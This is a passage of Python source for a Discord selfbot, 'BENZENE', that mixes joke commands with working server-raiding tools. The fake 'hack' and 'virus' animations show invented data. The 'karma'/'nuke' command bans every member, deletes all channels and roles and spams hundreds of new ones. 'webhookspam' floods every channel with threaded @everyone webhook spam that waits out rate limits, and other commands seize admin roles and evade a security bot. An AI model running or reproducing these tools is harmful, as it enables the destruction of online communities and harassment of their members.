            f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```"
        )
    else:
        password = [
            'password', '123', 'mypasswordispassword', user.name + "iscool123",
            user.name + "isdaddy", "daddy" + user.name, "ilovediscord",
            "i<3discord", "furryporn456", "secret", "123456789", "apple49",
            "redskins32", "princess", "dragon", "password1", "1q2w3e4r",
            "ilovefurries"
        ]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: be {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```"
        )


@client.command()
async def selfbotinfo(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=0)
    embed.set_author(name='BENZENE SELFBOT INFO')
    embed.set_thumbnail(url='https://cdn.discordapp.com/emojis/849783904189546561.png')
    embed.set_image(url="https://images-ext-2.discordapp.net/external/H8b7EPaoFatzB4NkEIMJYFL32RnL32M4V6VNXpMEHsA/%3Fwidth%3D540%26height%3D227/https/media.discordapp.net/attachments/697225400505598044/783144406889922580/image0.gif")
    embed.set_footer(text='INFO OF SEPTILE SELF BOT')
    embed.add_field(name='___**SELFBOT  INFO**___', value='```ALL THE INFO ABOUT SELFBOT```')
    embed.add_field(name='___**DEVELOPER**___', value='** SATYAWADIS OP | BENZENE SELF BOT. DISCORD.GG/SATYAOP**')
    embed.add_field(name='___**DATE OF CREATION**___', value='**2021 , 28 MAY , FRIDAY**')
    embed.add_field(name='___**DISCORD VERSION**___', value='**discord.py 1.7.2**')
    embed.add_field(name='___**LANGUAGE**___', value='**PYTHON 3.8.2 version**')
    embed.add_field(name='___**SERVER LINK**___', value='**https://discord.gg/jF879hKJ4y**')
    await ctx.send(embed=embed)


@client.command(aliases=['dong', 'penis'])
async def lund(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    await ctx.send(f"{user}'s Dick size\n8{dong}D")
    
    
@client.command()
async def securitynuke(ctx):
    await ctx.send(f"!rc FUCKED BY BENZENE")
    await ctx.send(f"!rr BENZENE")
    await ctx.send(f"!renameserver TRASHED BY BENZENE")
    
@client.command(aliases=['webhookfuck', 'spamwebhooks', 'webhooknuke', 'webhooksnuke', 'webhooksfuck', 'spamwebhook'])
async def webhookspam(ctx):
    global spammingdawebhookeroos
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=ssspam, args=(webhook.url,)).start()

    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 50 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='Wizzed by LEGEND')
                threading.Thread(target=ssspam, args=(webhook.url,)).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                print(f" > Webhook Error")
                
                
def ssspam(webhook):
    while spammingdawebhookeroos:
        randcolor = random.randint(0, 16777215)
        data = {'content':'@everyone  BENZENE RUNS YOU https://discord.gg/satyaop',
         'embeds':[
          {'title':'BENZENE WISH YOUR SERVER WILL GET SECURED SOON....',
           'tts':'true',
           'description':'.',
           'url':'https://discord.gg/satyaop',
           'color':randcolor,
           'fields':[
            {'name':'BENZENE RUNS YOU?',
             'value':'.'},
            {'name':'BENZENE',
             'value':'DISCORD.GG/SATYAOP'},
            {'name':'BENZENE ON TOP',
             'value':'.'},
            {'name':'.',
             'value':'.'}],
           'author':{'name':'BENZENE ON TOP',
            'url':'https://imgur.com/Lib5iyC',
            'icon_url':'https://imgur.com/Lib5iyC'},
           'footer':{'text':'BENZENE runs you',
            'icon_url':'https://imgur.com/Lib5iyC'},
           'image':{'url': 'https://imgur.com/Lib5iyC'},
           'thumbnail':{'url': 'https://imgur.com/Lib5iyC'}},
          {'url':'https://www.instagram.com/jasskiller12/',
           'image':{'url': 'https://imgur.com/Lib5iyC'}},
          {'url':'https://www.instagram.com/jasskiller12/',
           'image':{'url': 'https://imgur.com/Lib5iyC'}},
          {'url':'https://www.instagram.com/jasskiller12/',
           'image':{'url': 'https://imgur.com/Lib5iyC'}}],
         'username':'WIZZED BY BENZENE',
         'avatar_url':'https://imgur.com/Lib5iyC'}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


@client.command()
async def fn(ctx):
    await ctx.message.delete()
    message = await ctx.send("""```
    ⣀⣤
⠀⠀⠀⠀⣿⠿⣶
⠀⠀⠀⠀⣿⣿⣀
⠀⠀⠀⣶⣶⣿⠿⠛⣶
⠤⣀⠛⣿⣿⣿⣿⣿⣿⣭⣿⣤
⠒⠀⠀⠀⠉⣿⣿⣿⣿⠀⠀⠉⣀
⠀⠤⣤⣤⣀⣿⣿⣿⣿⣀⠀⠀⣿
⠀⠀⠛⣿⣿⣿⣿⣿⣿⣿⣭⣶⠉
⠀⠀⠀⠤⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⣭⣿⣿⣿⠀⣿⣿⣿
⠀⠀⠀⣉⣿⣿⠿⠀⠿⣿⣿
⠀⠀⠀⠀⣿⣿⠀⠀⠀⣿⣿⣤
⠀⠀⠀⣀⣿⣿⠀⠀⠀⣿⣿⣿
⠀⠀⠀⣿⣿⣿⠀⠀⠀⣿⣿⣿
⠀⠀⠀⣿⣿⠛⠀⠀⠀⠉⣿⣿
⠀⠀⠀⠉⣿⠀⠀⠀⠀⠀⠛⣿
⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣿⣿
⠀⠀⠀⠀⣛⠀⠀⠀⠀⠀⠀⠛⠿⠿⠿
⠀⠀⠀⠛⠛
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
   ⣀⣶⣀
⠀⠀⠀⠒⣛⣭
⠀⠀⠀⣀⠿⣿⣶
⠀⣤⣿⠤⣭⣿⣿
⣤⣿⣿⣿⠛⣿⣿⠀⣀
⠀⣀⠤⣿⣿⣶⣤⣒⣛
⠉⠀⣀⣿⣿⣿⣿⣭⠉
⠀⠀⣭⣿⣿⠿⠿⣿
⠀⣶⣿⣿⠛⠀⣿⣿
⣤⣿⣿⠉⠤⣿⣿⠿
⣿⣿⠛⠀⠿⣿⣿
⣿⣿⣤⠀⣿⣿⠿
⠀⣿⣿⣶⠀⣿⣿⣶
⠀⠀⠛⣿⠀⠿⣿⣿
⠀⠀⠀⣉⣿⠀⣿⣿
⠀⠶⣶⠿⠛⠀⠉⣿
⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⠀⠀⠀⣶⣿⠿
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠶⠀⠀⣀⣀
⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣶⣿⣿⣿⣿⣿⣿
⠀⠀⣀⣶⣤⣤⠿⠶⠿⠿⠿⣿⣿⣿⣉⣿⣿
⠿⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⣤⣿⣿⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⣶⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⠿⣛⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠛⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠿⠀⣿⣿⣿⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⣿⠀⠀⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠛⠀⠀⣿⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⠤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⣀
⠀⠿⣿⣿⣀
⠀⠉⣿⣿⣀
⠀⠀⠛⣿⣭⣀⣀⣤
⠀⠀⣿⣿⣿⣿⣿⠛⠿⣶⣀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⣉⣶
⠀⠀⠉⣿⣿⣿⣿⣀⠀⠀⣿⠉
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿
⠀⣀⣿⣿⣿⣿⣿⣿⣿⣿⠿
⠀⣿⣿⣿⠿⠉⣿⣿⣿⣿
⠀⣿⣿⠿⠀⠀⣿⣿⣿⣿
⣶⣿⣿⠀⠀⠀⠀⣿⣿⣿
⠛⣿⣿⣀⠀⠀⠀⣿⣿⣿⣿⣶⣀
⠀⣿⣿⠉⠀⠀⠀⠉⠉⠉⠛⠛⠿⣿⣶
⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉
⣀⣶⣿⠛
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⠀⣀⣀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣿
⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣶⣿⣿⣿⣶⣶⣤⣶⣶⠶⠛⠉⠉
⠀⠀⠀⠀⠀⠀⣤⣿⠿⣿⣿⣿⣿⣿⠀⠀⠉
⠛⣿⣤⣤⣀⣤⠿⠉⠀⠉⣿⣿⣿⣿
⠀⠉⠉⠉⠉⠉⠀⠀⠀⠀⠉⣿⣿⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣛⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠛⠿⣿⣿⣿⣶⣤
⠀⠀⠀⠀⠀⠀⠀⣿⠛⠉⠀⠀⠀⠛⠿⣿⣿⣶⣀
⠀⠀⠀⠀⠀⠀⣿⣀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣶⣤
⠀⠀⠀⠀⠀⠛⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠉⠉
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⣤⣶⣶
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣀⣀
⠀⠀⠀⠀⠀⣀⣶⣿⣿⣿⣿⣿⣿
⣤⣶⣀⠿⠶⣿⣿⣿⠿⣿⣿⣿⣿
⠉⠿⣿⣿⠿⠛⠉⠀⣿⣿⣿⣿⣿
⠀⠀⠉⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣤⣤
⠀⠀⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿
⠀⠀⠀⠀⣀⣿⣿⣿⠿⠉⠀⠀⣿⣿⣿⣿
⠀⠀⠀⠀⣿⣿⠿⠉⠀⠀⠀⠀⠿⣿⣿⠛
⠀⠀⠀⠀⠛⣿⣿⣀⠀⠀⠀⠀⠀⣿⣿⣀
⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠿⣿⣿
⠀⠀⠀⠀⠀⠉⣿⣿⠀⠀⠀⠀⠀⠀⠉⣿
⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⠀⠀⠀⠀⣀⣿⣿
⠀⠀⠀⠀⠤⣿⠿⠿⠿
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⣀
⠀⠀⣶⣿⠿⠀⠀⠀⣀⠀⣤⣤
⠀⣶⣿⠀⠀⠀⠀⣿⣿⣿⠛⠛⠿⣤⣀
⣶⣿⣤⣤⣤⣤⣤⣿⣿⣿⣀⣤⣶⣭⣿⣶⣀
⠉⠉⠉⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⠛⠛⠿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⠛⠿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⠀⣿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⣶⣿⠛⠉
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠀⠀⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⣶⣿⣶
⠀⠀⠀⣤⣤⣤⣿⣿⣿
⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣶
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⣿⣉⣿⣿⣿⣿⣉⠉⣿⣶
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿
⠀⣤⣿⣿⣿⣿⣿⣿⣿⠿⠀⣿⣶
⣤⣿⠿⣿⣿⣿⣿⣿⠿⠀⠀⣿⣿⣤
⠉⠉⠀⣿⣿⣿⣿⣿⠀⠀⠒⠛⠿⠿⠿
⠀⠀⠀⠉⣿⣿⣿⠀⠀⠀⠀⠀⠀⠉
⠀⠀⠀⣿⣿⣿⣿⣿⣶
⠀⠀⠀⠀⣿⠉⠿⣿⣿
⠀⠀⠀⠀⣿⣤⠀⠛⣿⣿
⠀⠀⠀⠀⣶⣿⠀⠀⠀⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠉
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶
⠀⠀⠀⠀⠀⣀⣀⠀⣶⣿⣿⠶
⣶⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤
⠀⠉⠶⣶⣀⣿⣿⣿⣿⣿⣿⣿⠿⣿⣤⣀
⠀⠀⠀⣿⣿⠿⠉⣿⣿⣿⣿⣭⠀⠶⠿⠿
⠀⠀⠛⠛⠿⠀⠀⣿⣿⣿⣉⠿⣿⠶
⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠒
⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣿⣿⣿⠛⣭⣭⠉
⠀⠀⠀⠀⠀⣿⣿⣭⣤⣿⠛
⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿⣭
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⠿⣶⣤
⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⣶⣶⠿⠿⠿
⠀⠀⠀⠀⠀⠀⣿⠛
⠀⠀⠀⠀⠀⠀⣭⣶
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿
⠀⠀⣶⠀⠀⣀⣤⣶⣤⣉⣿⣿⣤⣀
⠤⣤⣿⣤⣿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣀
⠀⠛⠿⠀⠀⠀⠀⠉⣿⣿⣿⣿⣿⠉⠛⠿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⠛⠀⠀⠀⣶⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣤⠀⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿⣿⠿⠉⠉
⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠉
⠀⠀⠀⠀⠀⠀⠀⠀⣛⣿⣭⣶⣀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣉⠀⣶⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠛⠿⠛
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⣶⣿⣶
⠀⠀⠀⣿⣿⣿⣀
⠀⣀⣿⣿⣿⣿⣿⣿
⣶⣿⠛⣭⣿⣿⣿⣿
⠛⠛⠛⣿⣿⣿⣿⠿
⠀⠀⠀⠀⣿⣿⣿
⠀⠀⣀⣭⣿⣿⣿⣿⣀
⠀⠤⣿⣿⣿⣿⣿⣿⠉
⠀⣿⣿⣿⣿⣿⣿⠉
⣿⣿⣿⣿⣿⣿
⣿⣿⣶⣿⣿
⠉⠛⣿⣿⣶⣤
⠀⠀⠉⠿⣿⣿⣤
⠀⠀⣀⣤⣿⣿⣿
⠀⠒⠿⠛⠉⠿⣿
⠀⠀⠀⠀⠀⣀⣿⣿
⠀⠀⠀⠀⣶⠿⠿⠛
```""")




@client.command()
async def virus(ctx, user: discord.Member = None, *, virus: str = "trojan"):
        user = user or ctx.author
        list = (
            f"``[▓▓▓                    ] / {virus}-virus.exe Packing files.``",
            f"``[▓▓▓▓▓▓▓                ] - {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓           ] \ {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓         ] | {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ] / {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] - {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] \ {virus}-virus.exe Packing files..``",
            f"``Successfully downloaded {virus}-virus.exe``",
            "``Injecting virus.   |``",
            "``Injecting virus..  /``",
            "``Injecting virus... -``",
            f"``Successfully Injected {virus}-virus.exe into {user.name}``",
        )
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)







@client.command()
async def nukecmd(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=0)
    embed.set_author(name='BENZENE SELFBOT')
    embed.set_thumbnail(url='https://www.google.com/search?q=benzene+sticker&rlz=1C1CHBF_enIN922IN922&sxsrf=AOaemvLC65wyJPsteo8Jb-hlyfwO_9H_hA:1635439320797&tbm=isch&source=iu&ictx=1&fir=iq8Z1zOuQXjgrM%252Csb-CFq6Mcvfu0M%252C_%253BvbXN5ZJl7AkPPM%252CqHjlJltCbRB6DM%252C_%253By50o_8r2s7WbIM%252C7rOG4BnNqQLZnM%252C_%253BU6r1qKoFT4VCgM%252Ccn91_H4aKypTsM%252C_%253BLr0XLFhbv5bfXM%252CgMWG41rOs2fujM%252C_%253B_FRt6ZfRLp0p8M%252C7rOG4BnNqQLZnM%252C_%253BEnAmcAX__x3P4M%252Caa2JyQwQhv1riM%252C_%253BX1ArWDRse6I6xM%252CsndZUsSsD9EhWM%252C_%253Bx4eRqRolKqJnqM%252CrC6Q3o6GR4D09M%252C_%253BX6O3xbNm6S6zLM%252C-74mJBuB5eYi_M%252C_%253BcDt0KUApSnoPQM%252CizkUqxS62pxQtM%252C_%253Bg6J78Hi7hfsEEM%252CGaVYmBljGt5DgM%252C_%253BD6HetpdU4w2kTM%252C4IIZ-8c0jfCyvM%252C_%253BQn9icVuBXc8nQM%252CLBH0RQVjmklGfM%252C_%253BN8Nyg4O_-6w8UM%252CwiDfutISGhvUkM%252C_&vet=1&usg=AI4_-kRsVBI2Xfok_2zgothsQCJ0tLuZvA&sa=X&ved=2ahUKEwj02JGexu3zAhVDeH0KHR0_CoIQ9QF6BAgWEAE#imgrc=y50o_8r2s7WbIM')
    embed.set_footer(text='Created by BENZENE')
    embed.set_image(url="https://tenor.com/view/kabir-singh-gif-20531622")
    embed.add_field(name='___**NUKE COMMANDS**___', value='```NUKE COMMANDS ARE HERE lol xD```')
    embed.add_field(name='**DELCHANNEL**', value='```THIS COMMAND DELETE ALL CHANNEL OF SERVER ```')
    embed.add_field(name='**DELROLE**', value='```DELETE ALL ROLES OF THE SERVER```')
    embed.add_field(name='**SPAMCHANNEL**', value='```THIS COMMAND CREATE TONS OF CHANNELS xD```')
    embed.add_field(name='**SPAMROLE**', value='```THIS COMMAND CREATE TONS OF ROLES```')
    embed.add_field(name='**NUKEEMOJI**', value='```THIS COMMAND FILL THE SERVER WITH EMOJI LOL```')
    embed.add_field(name='**NUKEALL**', value='```THIS COMMAND NUKE FULL SERVER```')
    embed.add_field(name='**GIVEADMIN**', value='```THIS COMMAND GIVE ADMIN IN EVERY ROLE```')
    embed.add_field(name='**KARMA**', value='```THIS COMMAND NUKE THE SERVER BRUTALLY!! #noMersy```')
    embed.add_field(name='**GCSPAM**', value='```THIS COMMAND PUT YOUR NAME IN GC NAME```')
    embed.add_field(name='**SECURITYNUKE**', value='```NUKE IN THE WAY SECURITY WILL NOT PUNISH YOU || ONLY WORK IF YOUR PRIFIX IS !```')
    embed.add_field(name='**WEBHOOKSPAM**', value='```FILL WHOLE SERVER CHANNELS WITH WEBHOOK SPAM {RAPID SPEED}```')
    embed.add_field(name='**STOPWEBHOOKSPAM**', value='```STOP SPAMMING WEBHOOK IF U STARTED WEBHOOM SPAM```')
    embed.add_field(name='**DELWEBHOOK**', value='```DELETE THE WEBHOOK GIVEN || ex - $DELWEBHOOK { WEBHOOK URL }```')
    await ctx.send(embed=embed) 
    
    
@client.command(aliases=["givemeadmin", "giveadminrole", "giveadminroles"])
async def giveadmin(ctx):
    await ctx.message.delete()
    for role in ctx.guild.roles:
        try:
            if role.permissions.administrator:
                await ctx.author.add_roles(role)
        except:
            pass

@client.command(aliases=["rekt", "nuke"])
async def karma(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="TRASHED BY 'BENZENE",
            description="BENZENE SELF BOT",
            reason="BENZENE ON TOP",
            icon="https://media.discordapp.net/attachments/777374893632258099/777396775375077376/image0.png",
            banner=None
        )
    except:
        pass
    for _i in range(400):
        await ctx.guild.create_text_channel(name="GET NUKED BITCH , BENZENE ON TOP")
    for _i in range(400):
        await ctx.guild.create_role(name="@BENZENE RUNS YOU", colour=0x39138b)
    
@client.command
async def nukeemoji(ctx):
    await ctx.message.delete()
    with open("data/yuo-bomb-emoji-for-server-nukes.jpeg", "rb") as f:
        img1 = f.read()
    with open("data/yuo-clown-emoji-for-server-nukes.jpeg", "rb") as f:
        img2 = f.read()
    with open("data/yuo-nuke-emoji-for-server-nukes.jpeg", "rb") as f:
        img3 = f.read()

    with open("data/yuo-orange-justice-gif-for-server-nukes.jpeg", "rb") as f:
        gif1 = f.read()

    with open("data/yuo-nuke-gif-for-server-nukes.jpeg", "rb") as f:
        gif2 = f.read()
        

    
@client.command()
async def delrole(ctx):
  total_roles = ""
  for role in ctx.guild.roles:
    try:
      await role.delete()
    except:
      pass 
  embed = discord.Embed(title="Done Deleting All Roles", color=0xaf1aff)
  await ctx.send(embed=embed)
  await ctx.message.delete()


@client.command(aliases=["guildinfo"])
async def doxserver(ctx):
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    embed = discord.Embed(title=f"{ctx.guild.name}",
                          description=f"{len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
                          timestamp=datetime.datetime.utcnow(), color=discord.Color.blue())
    embed.add_field(name="Server created at", value=f"{ctx.guild.created_at.strftime(date_format)}")
    embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
    embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
    embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
    embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
    await ctx.send(embed=embed)
    
@client.command(aliases=["spamroles"])
async def massrole(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name="BENZENE ON TOP", colour=0x39138b)
        except:
            return



@client.command()
async def statuscmd(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=0)
    embed.set_author(name='BENZENE SELFBOT')
